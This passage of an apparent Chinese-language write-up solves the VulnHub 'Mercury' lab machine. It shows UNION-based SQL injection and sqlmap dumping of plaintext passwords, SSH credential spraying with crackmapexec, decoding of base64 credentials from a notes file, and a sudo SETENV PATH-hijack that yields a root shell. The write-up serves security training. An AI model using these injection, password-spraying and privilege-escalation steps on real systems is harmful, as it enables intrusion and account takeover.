<p>先用<code>UNION SELECT database()</code>查库名。<br class='item-img' data-src='/pic/assets/1684916975671-31af4a77-f7ac-4bc1-a45d-eeeb5fac9432.png'><img src="/pic/assets/1684916975671-31af4a77-f7ac-4bc1-a45d-eeeb5fac9432.png" alt="UNION_SELECT_db.png"><br>再用<code>UNION SELECT group_concat(table_name) from information_schema.tables where table_schema=database()</code>查表名。注意，此处如果直接<code>from information_schema.tables</code>查只会得到默认库中的表名，获得不到mercury库的表信息，需要我们自己指定数据库<code>where table_schema=database()</code>才行。<br class='item-img' data-src='/pic/assets/1684917046883-15d9a013-5ffc-45df-8821-f558d93dec2f.png'><img src="/pic/assets/1684917046883-15d9a013-5ffc-45df-8821-f558d93dec2f.png" alt="UNION_SELECT_tables.png"><br>接下来<code>UNION SELECT group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;</code>查列名。小技巧，如果单引号被过滤可以用16进制表名绕过。<br class='item-img' data-src='/pic/assets/1684917230296-1c5e3ee2-9852-44f0-ad55-0ddedc9fd12e.png'><img src="/pic/assets/1684917230296-1c5e3ee2-9852-44f0-ad55-0ddedc9fd12e.png" alt="UNION-col.png"><br>东西都齐了直接查我们要的信息吧。<code>UNION SELECT group concat(id,Ox7c,username,Ox7c,password)from users</code>。<code>Ox7c</code>是’|’的hex值，主要是我们加进来为了分割一下结果。<br class='item-img' data-src='/pic/assets/1684917352986-d4faa9e2-c552-40bd-afc4-7ce02492e992.png'><img src="/pic/assets/1684917352986-d4faa9e2-c552-40bd-afc4-7ce02492e992.png" alt="union-getuser.png"><br>可以发现结果已经出来了。</p>
<h3 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h3><p>用sqlmap也可以，很快。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]<br>└─$ sudo sqlmap -u http://192.168.56.103:8080/mercuryfacts/ <br><br>┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]<br>└─$ sudo sqlmap -u http://192.168.56.103:8080/mercuryfacts/ --dbs<br><br>┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]<br>└─$ sudo sqlmap -u http://192.168.56.103:8080/mercuryfacts/ -D mercury --tables<br><br>┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]<br>└─$ sudo sqlmap -u http://192.168.56.103:8080/mercuryfacts/ -D mercury -T <span class="hljs-built_in">users</span> --columns<br><br>┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]<br>└─$ sudo sqlmap -u http://192.168.56.103:8080/mercuryfacts/ -D mercury -T <span class="hljs-built_in">users</span> --dump<br></code></pre></td></tr></table></figure>
<p>我们将获得的结果存进一个文件里并简单处理下存进两个txt文件中供之后尝试ssh登录备用。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]<br>└─$ <span class="hljs-built_in">cat</span> rawdata <br>+----+-------------------------------+-----------+<br>| <span class="hljs-built_in">id</span> | password                      | username  |<br>+----+-------------------------------+-----------+<br>| 1  | johnny1987                    | john      |<br>| 2  | lovemykids111                 | laura     |<br>| 3  | lovemybeer111                 | sam       |<br>| 4  | mercuryisthesizeof0.056Earths | webmaster |<br>+----+-------------------------------+-----------+<br><br>┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]<br>└─$ <span class="hljs-built_in">cat</span> rawdata | awk -F <span class="hljs-string">&#x27;|&#x27;</span> <span class="hljs-string">&#x27;&#123;print $3&#125;&#x27;</span> <br><br> password                      <br><br> johnny1987                    <br> lovemykids111                 <br> lovemybeer111                 <br> mercuryisthesizeof0.056Earths <br> <br>┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]<br>└─$ <span class="hljs-built_in">cat</span> rawdata | awk -F <span class="hljs-string">&#x27;|&#x27;</span> <span class="hljs-string">&#x27;&#123;print $3&#125;&#x27;</span> &gt; pass.txt<br>                                                                                                                             <br>┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]<br>└─$ <span class="hljs-built_in">cat</span> rawdata | awk -F <span class="hljs-string">&#x27;|&#x27;</span> <span class="hljs-string">&#x27;&#123;print $4&#125;&#x27;</span> &gt; username.txt<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]<br>└─$ sudo crackmapexec ssh 192.168.56.103 -u username.txt -p pass.txt --continue-on-success<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>SSH         192.168.56.103  22     192.168.56.103   [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1<br>SSH         192.168.56.103  22     192.168.56.103   [-] john:johnny1987 Authentication failed.<br>SSH         192.168.56.103  22     192.168.56.103   [-] john:lovemykids111 Authentication failed.<br>SSH         192.168.56.103  22     192.168.56.103   [-] john:lovemybeer111 Authentication failed.<br>SSH         192.168.56.103  22     192.168.56.103   [-] john:mercuryisthesizeof0.056Earths Authentication failed.<br>SSH         192.168.56.103  22     192.168.56.103   [-] john: Authentication failed.<br>SSH         192.168.56.103  22     192.168.56.103   [-] john: Authentication failed.<br>SSH         192.168.56.103  22     192.168.56.103   [-] laura:johnny1987 Authentication failed.<br>SSH         192.168.56.103  22     192.168.56.103   [-] laura:lovemykids111 Authentication failed.<br>SSH         192.168.56.103  22     192.168.56.103   [-] laura:lovemybeer111 Authentication failed.<br>SSH         192.168.56.103  22     192.168.56.103   [-] laura:mercuryisthesizeof0.056Earths Authentication failed.<br>SSH         192.168.56.103  22     192.168.56.103   [-] laura: Authentication failed.<br>SSH         192.168.56.103  22     192.168.56.103   [-] laura: Authentication failed.<br>SSH         192.168.56.103  22     192.168.56.103   [-] sam:johnny1987 Authentication failed.<br>SSH         192.168.56.103  22     192.168.56.103   [-] sam:lovemykids111 Authentication failed.<br>SSH         192.168.56.103  22     192.168.56.103   [-] sam:lovemybeer111 Authentication failed.<br>SSH         192.168.56.103  22     192.168.56.103   [-] sam:mercuryisthesizeof0.056Earths Authentication failed.<br>SSH         192.168.56.103  22     192.168.56.103   [-] sam: Authentication failed.<br>SSH         192.168.56.103  22     192.168.56.103   [-] sam: Authentication failed.<br>SSH         192.168.56.103  22     192.168.56.103   [-] webmaster:johnny1987 Authentication failed.<br>SSH         192.168.56.103  22     192.168.56.103   [-] webmaster:lovemykids111 Authentication failed.<br>SSH         192.168.56.103  22     192.168.56.103   [-] webmaster:lovemybeer111 Authentication failed.<br>SSH         192.168.56.103  22     192.168.56.103   [+] webmaster:mercuryisthesizeof0.056Earths <br>SSH         192.168.56.103  22     192.168.56.103   [-] webmaster: Authentication failed.<br>SSH         192.168.56.103  22     192.168.56.103   [-] webmaster: Authentication failed.<br>SSH         192.168.56.103  22     192.168.56.103   [-] :johnny1987 Authentication failed.<br>SSH         192.168.56.103  22     192.168.56.103   [-] :lovemykids111 Authentication failed.<br>SSH         192.168.56.103  22     192.168.56.103   [-] :lovemybeer111 Authentication failed.<br>^C<br><br>[*] Shutting down, please <span class="hljs-built_in">wait</span>...<br></code></pre></td></tr></table></figure>
<p>发现有可以成功登录的凭证，懒得等他跑完了，直接登录吧。</p>
<h2 id="Priv-Esca"><a href="#Priv-Esca" class="headerlink" title="Priv Esca"></a>Priv Esca</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]<br>└─$ ssh webmaster@192.168.56.103                                                          <br>The authenticity of host <span class="hljs-string">&#x27;192.168.56.103 (192.168.56.103)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:mHhkDLhyH54cYFlptygnwr7NYpEtepsNhVAT8qzqcUk.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>192.168.56.103<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">webmaster@192.168.56.103&#x27;</span>s password: <br>Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-45-generic x86_64)<br><br> * Documentation:  https://help.ubuntu.com<br> * Management:     https://landscape.canonical.com<br> * Support:        https://ubuntu.com/advantage<br><br>  System information as of Tue 23 May 17:02:38 UTC 2023<br><br>  System load:  0.0               Processes:               106<br>  Usage of /:   74.9% of 4.86GB   Users logged <span class="hljs-keyword">in</span>:         0<br>  Memory usage: 30%               IPv4 address <span class="hljs-keyword">for</span> enp0s3: 192.168.56.103<br>  Swap usage:   0%<br><br><br>22 updates can be installed immediately.<br>0 of these updates are security updates.<br>To see these additional updates run: apt list --upgradable<br><br><br>The list of available updates is more than a week old.<br>To check <span class="hljs-keyword">for</span> new updates run: sudo apt update<br>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings<br><br><br>Last login: Tue Sep  1 13:57:14 2020 from 192.168.31.136<br>webmaster@mercury:~$ <span class="hljs-built_in">whoami</span><br>webmaster<br>webmaster@mercury:~$ <span class="hljs-built_in">pwd</span><br>/home/webmaster<br>webmaster@mercury:~/mercury_proj$ sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> webmaster: <br>Sorry, user webmaster may not run sudo on mercury.<br>webmaster@mercury:~$ <span class="hljs-built_in">ls</span> -la<br>total 36<br>drwx------ 4 webmaster webmaster 4096 Sep  2  2020 .<br>drwxr-xr-x 5 root      root      4096 Aug 28  2020 ..<br>lrwxrwxrwx 1 webmaster webmaster    9 Sep  1  2020 .bash_history -&gt; /dev/null<br>-rw-r--r-- 1 webmaster webmaster  220 Aug 27  2020 .bash_logout<br>-rw-r--r-- 1 webmaster webmaster 3771 Aug 27  2020 .bashrc<br>drwx------ 2 webmaster webmaster 4096 Aug 27  2020 .cache<br>drwxrwxr-x 5 webmaster webmaster 4096 Aug 28  2020 mercury_proj<br>-rw-r--r-- 1 webmaster webmaster  807 Aug 27  2020 .profile<br>-rw-rw-r-- 1 webmaster webmaster   75 Sep  1  2020 .selected_editor<br>-rw------- 1 webmaster webmaster   45 Sep  1  2020 user_flag.txt<br>webmaster@mercury:~$ <span class="hljs-built_in">cat</span> user_flag.txt <br>[user_flag_8339915c9a454657bd60ee58776f4ccd]<br></code></pre></td></tr></table></figure>
<p>拿到了user_flag。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs bash">webmaster@mercury:~$ <span class="hljs-built_in">cat</span> .bash_history <br>webmaster@mercury:~$ <span class="hljs-built_in">cd</span> mercury_proj/<br>webmaster@mercury:~/mercury_proj$ <span class="hljs-built_in">ls</span> -la<br>total 28<br>drwxrwxr-x 5 webmaster webmaster 4096 Aug 28  2020 .<br>drwx------ 4 webmaster webmaster 4096 Sep  2  2020 ..<br>-rw-r--r-- 1 webmaster webmaster    0 Aug 27  2020 db.sqlite3<br>-rwxr-xr-x 1 webmaster webmaster  668 Aug 27  2020 manage.py<br>drwxrwxr-x 6 webmaster webmaster 4096 Sep  1  2020 mercury_facts<br>drwxrwxr-x 4 webmaster webmaster 4096 Aug 28  2020 mercury_index<br>drwxrwxr-x 3 webmaster webmaster 4096 Aug 28  2020 mercury_proj<br>-rw------- 1 webmaster webmaster  196 Aug 28  2020 notes.txt<br>webmaster@mercury:~/mercury_proj$ <span class="hljs-built_in">cat</span> notes.txt <br>Project accounts (both restricted):<br>webmaster <span class="hljs-keyword">for</span> web stuff - webmaster:bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK<br>linuxmaster <span class="hljs-keyword">for</span> linux stuff - linuxmaster:bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==<br>webmaster@mercury:~/mercury_proj$ <span class="hljs-built_in">cat</span> /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin<br>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin<br>systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin<br>messagebus:x:103:106::/nonexistent:/usr/sbin/nologin<br>syslog:x:104:110::/home/syslog:/usr/sbin/nologin<br>_apt:x:105:65534::/nonexistent:/usr/sbin/nologin<br>tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false<br>uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin<br>tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin<br>landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin<br>pollinate:x:110:1::/var/cache/pollinate:/bin/false<br>sshd:x:111:65534::/run/sshd:/usr/sbin/nologin<br>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin<br>mercury:x:1000:1000:mercury:/home/mercury:/bin/bash<br>lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false<br>mysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/false<br>webmaster:x:1001:1001:,,,:/home/webmaster:/bin/bash<br>linuxmaster:x:1002:1002:,,,:/home/linuxmaster:/bin/bash<br></code></pre></td></tr></table></figure>
<p>先看看bash history，没内容。那么我们看看网页目录下有啥，有个notes.txt。查看一下，里面好像存了一个linuxmaster的登录凭证的base64编码。我们<code>cat /etc/passwd</code>确定确实有该用户，那我们<code>echo &#39;bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==&#39; | base64 -d</code>解码一下尝试登录看看能不能成。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">webmaster@mercury:~/mercury_proj$ su linuxmaster<br>Password: <br>linuxmaster@mercury:/home/webmaster/mercury_proj$ sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> linuxmaster: <br>Matching Defaults entries <span class="hljs-keyword">for</span> linuxmaster on mercury:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User linuxmaster may run the following commands on mercury:<br>    (root : root) SETENV: /usr/bin/check_syslog.sh<br>linuxmaster@mercury:/home/webmaster/mercury_proj$ <span class="hljs-built_in">cat</span> /usr/bin/check_syslog.sh<br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-built_in">tail</span> -n 10 /var/log/syslog<br>linuxmaster@mercury:/home/webmaster/mercury_proj$ <span class="hljs-built_in">ls</span> -la /usr/bin/check_syslog.sh<br>-rwxr-xr-x 1 root root 39 Aug 28  2020 /usr/bin/check_syslog.sh<br></code></pre></td></tr></table></figure>
<p>发现成功登录，查看<code>sudo -l</code>发现此用户可以以root身份无密码运行<code>/usr/bin/check_syslog.sh</code>且有<code>SETENV</code>权限。我们查看<code>check_syslog.sh</code>的内容，发现就是用tail查看下系统日志。<br>值得注意的是，这里的tail是用相对路径而不是绝对路径写的，所以系统执行时从PATH中寻找的。正好此用户有<code>SETENV</code>的权限，那我们的提权思路就很明确了：我们伪造一个tail，并把其位置写在PATH前面，因为系统执行是从前往后寻找的，这样我们就能以root权限执行我们先要执行的命令了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs bash">linuxmaster@mercury:/tmp$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;/bin/bash -p&#x27;</span> &gt; <span class="hljs-built_in">tail</span><br>linuxmaster@mercury:/tmp$ <span class="hljs-built_in">chmod</span> +xs <span class="hljs-built_in">tail</span> <br>linuxmaster@mercury:/tmp$ <span class="hljs-built_in">ls</span> -la<br>total 48<br>drwxrwxrwt 10 root        root        4096 May 23 17:10 .<br>drwxr-xr-x 19 root        root        4096 Sep  1  2020 ..<br>-rwxr-xr-x  1 linuxmaster linuxmaster   39 May 23 17:05 backup<br>drwxrwxrwt  2 root        root        4096 May 23 13:14 .font-unix<br>drwxrwxrwt  2 root        root        4096 May 23 13:14 .ICE-unix<br>drwx------  3 root        root        4096 May 23 13:14 systemd-private-1295227d0ee948c7b42b8e747d46283d-systemd-logind.service-Pum4tf                                                                                                                    <br>drwx------  3 root        root        4096 May 23 13:14 systemd-private-1295227d0ee948c7b42b8e747d46283d-systemd-resolved.service-OBDWgg                                                                                                                  <br>drwx------  3 root        root        4096 May 23 13:14 systemd-private-1295227d0ee948c7b42b8e747d46283d-systemd-timesyncd.service-mA1HTi                                                                                                                 <br>-rwsrwsr-x  1 linuxmaster linuxmaster   13 May 23 17:10 <span class="hljs-built_in">tail</span><br>drwxrwxrwt  2 root        root        4096 May 23 13:14 .Test-unix<br>drwxrwxrwt  2 root        root        4096 May 23 13:14 .X11-unix<br>drwxrwxrwt  2 root        root        4096 May 23 13:14 .XIM-unix<br>linuxmaster@mercury:/tmp$ <span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span><br>linuxmaster@mercury:/tmp$ <span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br>/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games<br>linuxmaster@mercury:/tmp$ sudo PATH=<span class="hljs-variable">$PATH</span> /usr/bin/check_syslog.sh <br>root@mercury:/tmp<span class="hljs-comment"># whoami</span><br>root<br>root@mercury:/tmp<span class="hljs-comment"># ip a</span><br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:80:e5:a9 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.103/24 brd 192.168.56.255 scope global dynamic enp0s3<br>       valid_lft 584sec preferred_lft 584sec<br>    inet6 fe80::a00:27ff:fe80:e5a9/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>root@mercury:/tmp<span class="hljs-comment"># uname -a</span><br>Linux mercury 5.4.0-45-generic <span class="hljs-comment">#49-Ubuntu SMP Wed Aug 26 13:38:52 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br>root@mercury:/tmp<span class="hljs-comment"># exit</span><br><span class="hljs-built_in">exit</span><br>linuxmaster@mercury:/tmp$ sudo --preserve-env=PATH /usr/bin/check_syslog.sh <br>root@mercury:/tmp<span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br>root@mercury:/tmp<span class="hljs-comment"># cd ~</span><br>root@mercury:~<span class="hljs-comment"># ls -la</span><br>total 56<br>drwx------  5 root root 4096 Sep  2  2020 .<br>drwxr-xr-x 19 root root 4096 Sep  1  2020 ..<br>-rw-------  1 root root 3214 May 23 17:14 .bash_history<br>-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc<br>drwxr-xr-x  3 root root 4096 Aug 27  2020 .cache<br>-rw-------  1 root root   34 Sep  1  2020 .lesshst<br>drwxr-xr-x  3 root root 4096 Aug 28  2020 .<span class="hljs-built_in">local</span><br>-rw-------  1 root root 3619 Sep  1  2020 .mysql_history<br>-rw-r--r--  1 root root  161 Dec  5  2019 .profile<br>-rw-------  1 root root 1228 Sep  2  2020 root_flag.txt<br>drwx------  2 root root 4096 Aug 27  2020 .ssh<br>-rw-------  1 root root 9454 Sep  2  2020 .viminfo<br>root@mercury:~<span class="hljs-comment"># cat root_flag.txt </span><br>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@<br>@@@@@@@@@@@@@@@@@@@/<span class="hljs-comment">##////////@@@@@@@@@@@@@@@@@@@@</span><br>@@@@@@@@@@@@@@(((/(*(/((((((////////&amp;@@@@@@@@@@@@@<br>@@@@@@@@@@@((#(#(###((##//(((/(/(((*((//@@@@@@@@@@<br>@@@@@@@@/#(((#((((((/(/,*/(((///////(/*/*/#@@@@@@@<br>@@@@@@*((####((///*//(///*(/*//((/(((//**/((&amp;@@@@@<br>@@@@@/(/(((##/*((//(#(////(((((/(///(((((///(*@@@@<br>@@@@/(//((((#(((((*///*/(/(/(((/((////(/*/*(///@@@<br>@@@//**/(/(#(#(##((/(((((/(**//////////((//((*/#@@<br>@@@(//(/((((((#((((#*/((///((///((//////(/(/(*(/@@<br>@@@((//((((/((((#(/(/((/(/(((((#((((((/(/((/////@@<br>@@@(((/(((/##((#((/*///((/((/((##((/(/(/((((((/*@@<br>@@@(((/(##/#(((##((/((((((/(##(/##(#((/((((#((*%@@<br>@@@@(///(#(((((#(#(((((#(//((#((###((/(((((/(//@@@<br>@@@@@(/*/(##(/(###(((#((((/((####/((((///((((/@@@@<br>@@@@@@%//((((#############((((/((/(/(*/(((((@@@@@@<br>@@@@@@@@%#(((############(##((#((*//(/(*//@@@@@@@@<br>@@@@@@@@@@@/(#(####(###/((((((#(///((//(@@@@@@@@@@<br>@@@@@@@@@@@@@@@(((###((#(#(((/((///*@@@@@@@@@@@@@@<br>@@@@@@@@@@@@@@@@@@@@@@@%#(#%@@@@@@@@@@@@@@@@@@@@@@<br>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@<br><br>Congratulations on completing Mercury!!!<br>If you have any feedback please contact me at SirFlash@protonmail.com<br>[root_flag_69426d9fda579afbffd9c2d47ca31d90]<br>root@mercury:~#<br></code></pre></td></tr></table></figure>
<p>从上面的操作，我们可以看出对于<code>SETENV</code>权限，我们可以通过<code>sudo PATH=$PATH /usr/bin/check_syslog.sh </code>或<code>sudo --preserve-env=PATH /usr/bin/check_syslog.sh</code>两种方式强制以当前用户PATH执行。</p>
